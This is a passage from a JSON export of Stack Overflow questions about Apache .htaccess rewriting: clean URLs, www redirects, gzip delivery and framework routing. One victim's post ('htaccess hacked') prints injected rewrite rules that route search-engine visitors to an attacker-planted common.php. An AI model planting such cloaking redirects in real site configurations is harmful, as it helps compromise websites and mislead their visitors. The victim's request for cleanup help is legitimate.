within.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","friendly-url"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":627,"score":0,"question_id":9821222,"title":"Remove .php extension (explicitly written) for friendly URL","body":"<p>htaccess to remove the .php extension of my site's files.</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{SCRIPT_FILENAME} !-d\nRewriteCond %{SCRIPT_FILENAME} !-f\nRewriteRule ^(.*)$ $1.php [L,QSA]\n</code></pre>\n\n<p>Now, if I go to my site</p>\n\n<pre><code>www.mysite.com/home\n</code></pre>\n\n<p>works fine, it redirects to home.php but the URL is still friendly.</p>\n\n<p>But if I write this URL:</p>\n\n<pre><code>www.mysite.com/home.php\n</code></pre>\n\n<p>The home.php is served, and the URL is not friendly.</p>\n\n<p>How can I avoid this behavior? I want that if the user writes www.mysite.com/home.php, the URL displayed in the URL bar be www.mysite.com/home</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12995214,"title":"htaccess hacked - i've deleted code and file - what next?","body":"<p>My website was hacked recently. I think i've found the code that was added to the htaccess file, deleted it and then added script to prevent the htaccess file being accessed again. I've also deleted the php file that the hacked code refers to (common.php). What do i need to do next? I'm not a programmer or website developer but i really wanted to see if i could fix the problem myself as i've spent quite a few hours trying and don't give up easily.</p>\n\n<p>Here is the hacked code that i deleted;\n    <code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{HTTP_USER_AGENT} (google|yahoo) [OR]\n    RewriteCond %{HTTP_REFERER} (google|yahoo)\n    RewriteCond %{REQUEST_URI} /$ [OR]\n    RewriteCond %{REQUEST_FILENAME} (shtml|html|htm|php|xml|phtml|asp|aspx)$ [NC] \n    RewriteCond %{REQUEST_FILENAME} !common.php\n    RewriteCond /home/httpd/vhosts/bluestardive.com/httpdocs/common.php -f\n    RewriteRule ^.*$    /common.php [L]\n    &lt;/IfModule&gt;</code></p>\n\n<p>this code has to stay in the htaccess file as it redirects my url to seo friendly ones or the website errors, but has this code been hacked as well?</p>\n\n<p><code># Apache search queries statistic module\n    RewriteEngine On\n    AddHandler php5-fastcgi .php .php5\n    # &lt;contrexx&gt;\n    #   &lt;core_modules__alias&gt;\n        RewriteRule ^about-us$    /index.php?page=883 [L,NC]\n        RewriteRule ^ausfluge-und-aktivitaten$    /index.php?page=800 [L,NC]\n        RewriteRule ^bluestardive-news$    /index.php?page=919 [L,NC]\n        RewriteRule ^bookings$    /index.php?page=911 [L,NC]\n        RewriteRule ^diveresort$    /index.php?page=879 [L,NC]\n        RewriteRule ^diving$    /index.php?page=880 [L,NC]\n        RewriteRule ^excursions-and-activities$    /index.php?page=881 [L,NC]\n        RewriteRule ^galerie$    /index.php?section=gallery [L,NC]\n        RewriteRule ^oceannight$    http://www.bluestardive.com/index.php?page=906 [L,NC]\n        RewriteRule ^philosophy$    /index.php?page=846 [L,NC]\n        RewriteRule ^reservation$    /index.php?page=917 [L,NC]\n        RewriteRule ^reservierung$    /index.php?page=918 [L,NC]\n        RewriteRule ^resort$    /index.php?page=798 [L,NC]\n    #   &lt;/core_modules__alias&gt;\n    # &lt;/contrexx&gt;</code></p>\n\n<p>many thanks for any help\nClaire</p>\n"},{"tags":["php","apache",".htaccess","session"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12995043,"title":"removing php session timeout","body":"<p>I'm looking to remove the timeout on php sessions on my site. the result of:</p>\n\n<pre><code>var_dump(ini_get('session.save_path')); var_dump(ini_get('session.gc_maxlifetime')); var_dump(ini_get('session.cookie_lifetime'));\n</code></pre>\n\n<p>Is <em>string(13) \"/var/lib/php5\" string(4) \"1440\" string(1) \"0\"</em></p>\n\n<p>According to the forums I've seen, with session.cookie_lifetime set to 0 timeout should already be unlimited shouldn't it?</p>\n\n<p>So two questions:\nWhich values do I need to set to remove session timeout?\nAnd also... I understand I need to put code into .htaccess but where does the .htaccess need to be to take effect on php sessions?</p>\n"},{"tags":["apache",".htaccess","virtualhost"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12993719,"title":".htaccess strange behaviour","body":"<p>If I put theese lines to <code>.htaccess</code> everything works well (when I'm going to <code>http://www.example.ru</code> I'm redirected to <code>http://example.ru</code>).</p>\n\n<pre><code>RewriteEngine On\n\n# Installation directory\nRewriteBase /\n\n# Redirect all www to non-www\nRewriteCond %{HTTP_HOST} ^www.example.ru [NC]\nRewriteRule ^(.*)$ http://example.ru/$1 [L,R]\n</code></pre>\n\n<p>But If I put exactly same lines to <code>&lt;VirtualHost&gt;</code> -> <code>&lt;Directory&gt;</code> section trying to go to <code>http://www.example.ru</code> redirects me to <code>http://example.ru/www</code>.</p>\n\n<p>Anybody knows why?</p>\n\n<p><strong>UPD</strong></p>\n\n<p>New <code>VirtualHost</code>:</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n    ServerName example.ru\n    ServerAlias www.example.ru\n    ServerAdmin webmaster@localhost\n    DocumentRoot /home/example/www/example.ru/www\n\n    RewriteEngine On\n\n    &lt;Directory /home/example/www/example.ru&gt;\n            Options FollowSymLinks\n            AllowOverride All\n            Order allow,deny\n            Allow from all\n    &lt;/Directory&gt;\n\n    ErrorLog /home/example/www/example.ru/log/error.log\n\n    LogLevel warn\n\n    SetEnvIf Remote_Addr 127.0.0.1 loopback\n\n    CustomLog /home/example/www/example.ru/log/access.log combined env=!loopback\n\n    # Redirect all www to non-www\n    RewriteCond %{HTTP_HOST} ^www.example.ru [NC]\n    RewriteRule ^(.*)$ http://example.ru$1 [L,R]\n\n&lt;/VirtualHost&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12994734,"title":"adding & in the URL","body":"<p>I'm getting the 404 error due to a missing special character \"&amp;\" in the url. hence i want to change the url from </p>\n\n<p><a href=\"http://www.example.com/option=com_rplview=propertyshowpid=5127\" rel=\"nofollow\">http://www.example.com/option=com_rplview=propertyshowpid=5127</a></p>\n\n<p>to </p>\n\n<p><a href=\"http://www.example.com/option=com_rpl&amp;view=propertyshow&amp;pid=5127\" rel=\"nofollow\">http://www.example.com/option=com_rpl&amp;view=propertyshow&amp;pid=5127</a></p>\n\n<p>How can i do using .htaccess</p>\n\n<p>THanks,\nR</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":74,"score":4,"question_id":12864402,"title":".htaccess. Redirect requests to ~username folder","body":"<p>Situation:</p>\n\n<p>I'm moving a website from a production environment to a test environment.</p>\n\n<p>The test environment url is similar to   <code>http://192.168.1.100/~username/</code></p>\n\n<p>There are thousands of files which use the following within the html  </p>\n\n<pre><code>&lt;img src='/images/image.jpg' /&gt;\n</code></pre>\n\n<p>Since the request is going to root <code>http://192.168.1.100/</code> the files are 404.</p>\n\n<p>Rather than finding and replacing all of html I'd assume that there is an easy way to fix it with mod_rewrite via .htaccess.</p>\n\n<p>I've tried using the following</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^/~username/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /~username/$1\n</code></pre>\n\n<p>But did not work as expected.</p>\n\n<p>Thanks in advance.</p>\n\n<p><strong>UPDATE</strong>\nThe development environment resides within cpanel/whm.  So when the username is removed from the requested url, it now belongs to the root users.  So, my question now:  How do I update the .htaccess file for the root user to mod_rewrite back to the ~username?</p>\n"}]}
{"total":14527,"page":7,"pagesize":100,"questions":[{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12989168,"title":"url rewriting - dipslys an extra parameter","body":"<p>I am rewriting my website URLs in clean URLs (using <code>.htaccess</code>) . I have written this rule in my <code>.htaccess</code>.</p>\n\n<pre><code>RewriteRule ^details/([^/]+)/([^/]+) front/detailsnew.php?catid=$1&amp;title=$2 [NC] \n</code></pre>\n\n<p>But the URL displays as this:</p>\n\n<pre><code>My domain /details/Apartments/409-Palm-Beach-Condos#ad-image-0\n</code></pre>\n\n<p>I don't want the <code>#ad-image-0</code> to be shown. My a href link is  </p>\n\n<pre><code>My domain/details/European/Test-Bisuwer\n</code></pre>\n\n<p>Does anyone know what's wrong here?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":12990995,"title":"Can anybody please help me with some URL rewriting?","body":"<p>I am in the development of a file sharing website now i want to create seo friendly urls.I tried different .htaccess codes to implement that Anybody please help me to implement that </p>\n\n<p>I have a page <code>www.mydomain.com/gallery.php?id=2&amp;title=newimage</code></p>\n\n<p>I want them to be requested as <code>www.mydomain.com/newimage/1.html</code></p>\n\n<p>Please give me .htaccess code to rewrite <code>www.mydomain.com/gallery.php?id=2&amp;title=newimage</code>  to  <code>www.mydomain.com/newimage/1.html</code></p>\n"},{"tags":["php",".htaccess","redirect","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12993102,"title":"How can I use a .htaccess rewrite to a page that has a php header redirect?","body":"<p>this is my first post so go easy on me.</p>\n\n<p>Basically I am doing some rewrites in my htaccess file to change my made up search friendly URLs into actual URLs, and for the most part they are working.  For instance this:</p>\n\n<p><a href=\"http://www.negativeworld.org/7849/news/nintendo-download-for-may-24-2012\" rel=\"nofollow\">http://www.negativeworld.org/7849/news/nintendo-download-for-may-24-2012</a></p>\n\n<p>Will turn into this:</p>\n\n<p><a href=\"http://www.negativeworld.org/article.php?id=7849\" rel=\"nofollow\">http://www.negativeworld.org/article.php?id=7849</a></p>\n\n<p>Just fine... IF that article exists.  If the article doesn't exist, the php code uses this:</p>\n\n<pre><code>header(\"Location: boarderror.php\");\nexit;\n</code></pre>\n\n<p>To bring the user to boarderror.php.  This works fine if it the user gets there directly on article.php and the id is bad, but when I am trying to do the htaccess redirect from a search friendly url and the id is bad, the htaccess redirect just hangs for awhile before giving me this message: \"The page isn't redirecting properly\".</p>\n\n<p>What I want is for it to go to my boarderror.php page when there is a bad id.  So basically I want my htaccess page to take a server friendly URL, switch to the true URL, and well... just let go at that point, and the PHP will take it from there.  Here is my htaccess line that does the switch:</p>\n\n<pre><code>RewriteRule ^([0-9]+)/(news|review|editorial|podcast)/(.*)$ /article.php?id=$1 [L]\n</code></pre>\n\n<p>What am I doing wrong?  (BTW I realize that if I set up all of my search friendly URLs correctly there should never be a bad id anyway, but I want to be on the safe side...)</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12287823,"title":"Redirecting REQUEST_URI through virtual subdomain","body":"<p>I have been working on a website for some time now, and I got stuck when it came to url redirection. I successfully created virtual subdomains for pretty profile pages, but I have a problem with the remaining parameters.</p>\n\n<p>What I am trying to do is, when someone types \"username.mysite.net/about\" to the address line, he/she should be redirected to \"profile.php?u=username&amp;t=about\". Currently, people who try to reach \"username.mysite.net\" get successfully redirected to \"profile.php?u=username\". But when I try to pass the REQUEST_URI too like \"username.mysite.net/about\", it gives a 404 error.</p>\n\n<p>Below I copy the relevant parts of my htaccess file.</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^www.mysite.net\nRewriteCond %{HTTP_HOST} ^([^.]+).mysite.net\nRewriteRule ^$ /profile.php?u=%1%{REQUEST_URI} [L]\n</code></pre>\n\n<p>I would really appreciate some help. Thank you already...</p>\n"},{"tags":["apache",".htaccess","localhost"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12993066,"title":".htaccess rewrite rules not working for my css or images directory, but it is working for my javascript?","body":"<p>so I'm trying to debug my .htaccess file for www.240list.com.</p>\n\n<p>Basically, this is my htaccess file used for my mvc / directory rewrites for files and what not.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^[^\\.]+\\.[^\\.]+$\nRewriteRule ^.*$ http://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} -f\nRewriteRule .* - [L]\n\nRewriteRule ^(\\d+\\/)?Css/(.*)$ Resources/css/$2 [L]\nRewriteRule ^(\\d+\\/)?Javascript/(.*)$ Libs/Javascript/$2 [L]\nRewriteRule ^(\\d+\\/)?Images/(.*)$ Resources/images/$2 [L]\nRewriteRule .*$ App/index.php [L]\n</code></pre>\n\n<p>The site is not loading my css or images, if you go to the location of an image via what the rewrite url would be, <a href=\"http://www.240list.com/Images/Logo.png\" rel=\"nofollow\">http://www.240list.com/Images/Logo.png</a> for example, it's redirecting to my index.php because it is loading the autoloader for the mvc framwork, which happens if the first 3 driectory rewrite rules don't match.</p>\n\n<p>The odd thing is, everything was working with the htaccess on my Uniserver I was using for development on my localhost, yet when on hostgator the css and images directories aren't working yet the javascript is. They all have the same directory permissions if that matters.</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":["ajax","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12992672,"title":"How do I change the default behavior of my Worpress single post URL's?","body":"<p>I'm trying to figure out a way to change the behavior of wordpress single post url's so that instead of loading the page using the single.php file, I can instead load the post contents into the index.php page via ajax. The site is a wordpress site, but uses ajax to load all of the content into one page. Essentially the actual php file being read never changes, and instead any time a user clicks a new page, the page content is loaded via on ajax request.</p>\n\n<p>Is there any way that I could perhaps edit my .htaccess file so that when someone goes to www.mysite.com/blog/post-name that it loads index.php and tells a script to load the requested post contents into the index.php page via ajax? </p>\n\n<p>Thanks!</p>\n"},{"tags":["php","apache",".htaccess","url-rewriting"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1905,"score":2,"question_id":1101895,"title":"How to stop direct execution of a php page using htaccess rules?","body":"<p>In my .htaccess file I have defined the following rule to make my register page URL as  <code>http://example.com/register/</code></p>\n\n<pre><code>RewriteRule register/ /register.php\n</code></pre>\n\n<p>The above rule is perfectly fine but I can access my register page from <code>http://example.com/register/</code> as well as from <code>http://example.com/register.php</code>. </p>\n\n<p>I don't want that user will be able to access the URL from <code>http://example.com/register.php</code> URL, is there any RULE which I can define in .htaccess to stop execution of register.php URL or simply redirect any direct register.php request to /register/</p>\n"},{"tags":["php",".htaccess","mod-rewrite","multilingual"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12992719,"title":"How to redirect two url to the same file with .htaccess?","body":"<p>Here's my problem, I have a bilingual website nd I don't know how to manage the urls.</p>\n\n<p>I would like</p>\n\n<ul>\n<li><strong>mydomain.tld/contact-us</strong> and <strong>mydomain.tld/nous-contacter</strong> to show <strong>contact-us.php</strong></li>\n<li><strong>mydomain.tld/pricing</strong> and <strong>mydomain.tld/prix</strong> to show <strong>pricing.php</strong></li>\n<li><strong>mydomain.tld/pricing/item1</strong> and <strong>mydomain.tld/prix/item1</strong> to show <strong>pricing.php?what=item1</strong> (for this one I'm not sure how to handle that, any hint is appreciate).</li>\n</ul>\n\n<p>I can do the case one and two with ease with:</p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-d \nRewriteRule ^([^/\\.]+)/?$ $1.php [R] # R for debug, make sure it shows the right page\n</code></pre>\n\n<p>But I don't want to have 10 entries for 5 pages, and this is not a secure way.</p>\n\n<p>It would be great if (maybe) I can do something like: (contact-us|nous-contacter) as a condition. Still not sure if this is possible and if it is, if its the easiest and most secure way to do it.</p>\n\n<p>How can I do this?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12765529,"title":"Merging a few Mod Rewrite Rules","body":"<p>This is more like a follow up question to this one:\n<a href=\"http://stackoverflow.com/questions/4916222/htaccess-how-to-force-www-in-a-generic-way\">.htaccess - how to force &quot;www.&quot; in a generic way?</a></p>\n\n<p>I have this rules:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>And I would like to merge them with the ones provided on that answer:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} !^$\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteCond %{HTTPS}s ^on(s)|\nRewriteRule ^ http%1://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n</code></pre>\n\n<p>Are these the correct results (right order and rules)?</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{HTTP_HOST} !^$\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteCond %{HTTPS}s ^on(s)|\nRewriteRule ^ http%1://www.%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So far everything works as expected but all my tests where done in a temporal URL and not on the actual domain.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","opencart"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":928,"score":1,"question_id":4862691,"title":"Opencart .htaccess issue","body":"<p>I'm having similar problem My url is like name.domain.com/subdoamin/store/index.php?...</p>\n\n<p>and my htaccess file is :</p>\n\n<pre><code>Options +FollowSymlinks\n\n# Prevent Directoy listing \nOptions -Indexes\n\n# Prevent Direct Access to files\n&lt;FilesMatch \"\\.tpl\"&gt;\n Order deny,allow\n Deny from all\n&lt;/FilesMatch&gt;\n\n#&lt;FilesMatch \"\\.ini\"&gt;\n #Order deny,allow\n #Deny from all\n#&lt;/files&gt;\n\n# SEO URL Settings\nRewriteEngine On\nRewriteBase /store/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n#RewriteRule ^(.*)\\?*$ index.php?_route_=$1 [L,QSA]\nRewriteRule ^(.*) index.php [L,QSA]\n</code></pre>\n\n<p>however it is giving a <code>404 Not found</code> error</p>\n"},{"tags":["apache",".htaccess","http-status-code-301","opencart"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":861,"score":1,"question_id":1587709,"title":"OpenCart .htaccess 301 redirect","body":"<p>Using <a href=\"http://www.opencart.com/\" rel=\"nofollow\">OpenCart</a> how would I use a 301 redirect to add <code>www.</code> to the domain</p>\n\n<p><code>.htaccess</code> content:</p>\n\n<pre><code>#Options +FollowSymlinks\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\n#OPENCART REWRITES START\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*) index.php\n#OPENCART REWRITES END\n\nRewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} !^www\\.mysite\\.com$ [NC]\nRewriteRule ^(.*)$ http://www\\.mysite\\.com/$1 [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Note that 302 redirects are working</p>\n"},{"tags":["php",".htaccess","dns","subdomain","concrete"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12991590,"title":"Stuck with htaccess file in my main directory and do not know how to use it or get rid of it","body":"<p>Apparently there is a .htaccess file in my root directory which is messing up all of my other sites that are in the directory. </p>\n\n<p>I am currently using GoDaddy as my host.<br>\nThis is the situation i am facing:    </p>\n\n<p><li>I have a main domain which is hosted directly in the root folder<br>\n(ex. the index file would be found at /root/index.php)</li>\n<li>I have some other domains hosted in folders inside the sub-directories<br>\n(ex. root/domain2/index.php)</li>\n<li>the other websites work correctly.</li>\n<li>the main domain is built with concrete 5, the rest is built by basic php and html, using notepad++</li>\n<li>subdomains for the other domains are not working since they do not have access in the .htAccess file</li></p>\n\n<p>Now my question is that,<br>\nSince I cannot erase the .htAccess file, how could I manage making the subdomains?<br>\nThe .htaccess file is used only for the concrete website but is controlling everything for some reason, is there any way to fix it? </p>\n\n<p>Thanks!</p>\n\n<p>P.S. I was not the one building the concrete website, i was building the rest of the domains, so i do not clearly know how to use it. All i know is that once i erase the .htaccess the subdomains are working and the main domain in the root directory only allow to visit the index page of it.</p>\n\n<p>Just to be clear, There is a main site, lets call it site 1, which is hosted in the main directory, and there are the other sites, ex. site2-site5, Which i want to make subdomains for and it is not working unless i erase the .htaccess file. </p>\n\n<p>I hope the question is clear enough, if not and more details are needed, please tell me.</p>\n"},{"tags":[".htaccess","gzip","minify"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":703,"score":0,"question_id":9227037,"title":"how to setup htaccess to send gizzped js and css files","body":"<p>I've seen some related posts with similar questions, but it didn't resolved my issues so i'm creating a new question here.  </p>\n\n<p>I've compressed js &amp;&amp; css files using <code>gzip</code>. The js files are already minified before it compressed with gzip cmd.  </p>\n\n<p>Now i need to tell apache to serve gzipped version of js &amp; css files, if the browsers are compatible. for that i've added few lines of code in htaccess like this:  </p>\n\n<pre><code>AddType \"text/javascript\" .gz\nAddType \"text/css\" .gz\nAddEncoding gzip .gz\n\nRewriteCond %{REQUEST_FILENAME} \\.(js|css)$\nRewriteCond %{HTTP:Accept-encoding} gzip\nRewriteCond %{HTTP_USER_AGENT} !Safari\nRewriteCond %{REQUEST_FILENAME}.gz -f\nRewriteRule ^(.*)$ /$1.gz [QSA,L]\n\n&lt;FilesMatch .*\\.js.gz$&gt;\nForceType text/javascript\nHeader set Content-Encoding: gzip\n&lt;/FilesMatch&gt;\n&lt;FilesMatch .*\\.css.gz$&gt;\nForceType text/css\nHeader set Content-Encoding: gzip\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>and the directory structure for css &amp; js files inside public_html as follows:  </p>\n\n<pre><code>css/style.css\ncss/style.css.gz\njs/customjsfn.min.js\njs/customjsfn.min.js.gz\njs/jquery.js\njs/jquery.js.gz\n</code></pre>\n\n<p>In header i've included the css &amp; js files like this:  </p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"http://example.com/css/style.css\" /&gt;  \n&lt;script type=\"text/javascript\" src=\"http://example.com/js/customjsfn.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"http://example.com/js/jquery.min.js\"&gt;&lt;/script&gt;  \n</code></pre>\n\n<p>But the styles are not applied properly. When i checked the response code using firebug, it returns 404 for js &amp; css files.   </p>\n\n<p>Where i'm going wrong? can somebody get me out of this?<br>\nThanks!</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":8301232,"title":"Need 301 redirect from shared server ip address to domain name","body":"<p>A client of mine site was built during the time there was no domain point to it. So the url was something like this</p>\n\n<pre><code>http://xxx.xxx.xx.xx/~weburl/\n</code></pre>\n\n<p>The problem is google picked up on this url and since then it has not picked up on the new domain that was propagated.</p>\n\n<p>I need a 301 redirect setup so it will pick up on the new domain. Does anyone have any idea how I can fix this in the <code>.htaccess</code>?</p>\n"},{"tags":["apache",".htaccess","url-rewriting","zend-framework2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12979065,"title":"ZF2 Rewrite for Subdirectory / Url Routes","body":"<p>My public folder is within a sub-directory. So I am using two .htaccess files.</p>\n\n<p>The first one outside of the public folder directory is:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^(.*)$ public/$1 [NC,QSA]\n</code></pre>\n\n<p>The second one inside the public folder is the default Zend one:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>When I go to <a href=\"http://mydomainname.com/myappname\" rel=\"nofollow\">http://mydomainname.com/myappname</a> I get the following error:</p>\n\n<p>A 404 error occurred</p>\n\n<p>Page not found.</p>\n\n<p>The requested URL could not be matched by routing.</p>\n\n<p>,but this works of course when I go to <a href=\"http://mydomainname.com/myappname/public\" rel=\"nofollow\">http://mydomainname.com/myappname/public</a></p>\n\n<p>I am not sure whether my .htaccess needs to be fixed or if I need to fix my routes</p>\n"},{"tags":[".htaccess","mod-rewrite","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12988685,"title":".htaccess remove query string, keeping SEO style url","body":"<p><strong>Question:</strong></p>\n\n<p>Is it possible to clear the <code>%{QUERY_STRING}</code> without breaking any functionality of what I've accomplished in my .htaccess file.</p>\n\n<p>I want to prevent users from adding <code>?foo=bar</code> to the end of the url overwriting any predefined $_GET vars</p>\n\n<p><strong>(external re_write) Example:</strong> </p>\n\n<p>From: <code>example.com/foo/bar/hello/world?test=blah</code></p>\n\n<p>To: <code>example.com/foo/bar/hello/world</code></p>\n\n<p><strong>So far I have been able to accomplish this (internally):</strong></p>\n\n<p>From: <code>example.com/foo/bar/hello/world</code></p>\n\n<p>To: <code>example.com/index.php?foo=bar&amp;hello=world</code></p>\n\n<p><strong>.htaccess</strong></p>\n\n<pre><code># To externally redirect /dir/foo.php to /dir/foo\nRewriteCond %{THE_REQUEST} ^GET\\s.+\\.(?:html?|php|aspx?) [NC]\nRewriteRule ^(.+)\\.php$ /$1 [R=301,L,NC]\n\n# To externally redirect /dir/index to /dir/\nRewriteCond %{THE_REQUEST} ^GET\\s((.+)?(\\/)?)?(index) [NC]\nRewriteRule ^(([^/]+/)*)index$ /$1 [R=301,L,NC]\n\n# To internally redirect /dir/foo to /dir/foo.php\nRewriteCond %{REQUEST_URI} !\\.php$ [NC]\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule . %{REQUEST_URI}.php [L]\n\n# Prevent Rewrite on existing directories, files, and links\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L] #^ - [L]\n\n# To internally rewrite directories as query string\nRewriteRule ^([^/=]+)=([^/]*)(/(.+))?\\/?$ /$4?$1=$2 [N,QSA]\nRewriteRule ^([^/=]+)/([^/=]+)(/(.+))?\\/?$ /$4?$1=$2 [N,QSA]\nRewriteRule ^([^/=]+)(/(.+))?\\/?$ /$3?$1 [N,QSA]\n</code></pre>\n\n<p><strong>What I've tried:</strong></p>\n\n<pre><code>#if there is a query string\nRewriteCond %{QUERY_STRING} ^(.*)$ \nRewriteRule (.*) $1? [R=301,L] #remove query string\n</code></pre>\n\n<p>-</p>\n\n<pre><code>#if there is a query string\nRewriteCond %{QUERY_STRING} !=\"\"\nRewriteRule (.*) $1? [R=301,L] #remove query string\n</code></pre>\n\n<p>-</p>\n\n<pre><code>#if there is a query string\nRewriteCond %{QUERY_STRING} !=\"\"\nRewriteRule ^(.*)$ $1? [R=301,L] #remove query string\n</code></pre>\n\n<p>I read somewhere, and experienced it, that applying the above breaks anything I've already accomplished. Completely clearing the whole url if they are masked $_GET vars. Even crashes apache 0.o (forgive me for any silly regex or .htaccess code, they're aren't my strong suite and most of it was snippets I found on SO)</p>\n\n<p>is this possible? something I'm doing wrong?</p>\n\n<p>thanks</p>\n"},{"tags":[".htaccess","query-string","ssi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":141,"score":1,"question_id":11874142,"title":"htaccess remove only '?' sign from URL with query string","body":"<p>How to remove <code>?</code> sign from URL with query string</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12988338,"title":".htaccess - redirect domain name","body":"<p>I have a domain name <strong>www.domainA.com</strong> I want to redirect it to <strong>domainB</strong> in following manner.</p>\n\n<p><code>www.domainA.com</code> -> <code>www.domainB.com</code> <br>\n<code>www.domainA.com/anything</code> -> <code>www.domainB.com/rebrand</code></p>\n\n<p>How I can do this in htaccess, I have done following code but it redirecting to <code>/rebrand/</code> only.</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^\\/\nRewriteRule ^\\/$ http://www.domainB.com/ [L,R=301]\n\nRewriteCond %{HTTP_HOST} ^domainA\\.com$ [NC]\nRewriteRule ^(.*)$ http://www.domainB.com/rebrand/ [L,R=301]\n</code></pre>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":904,"score":1,"question_id":6656410,"title":"htaccess redirect hostname to FQDN","body":"<p>I have a machine that is local and if you type in <a href=\"http://host\" rel=\"nofollow\">http://host</a> it goes to the website on it. I want to use an htaccess to redirect to <a href=\"http://host.domain.com\" rel=\"nofollow\">http://host.domain.com</a>. In the end it is the same I just want to use the proper url for documentation purposes. I tried this but didn't work</p>\n\n<pre><code> 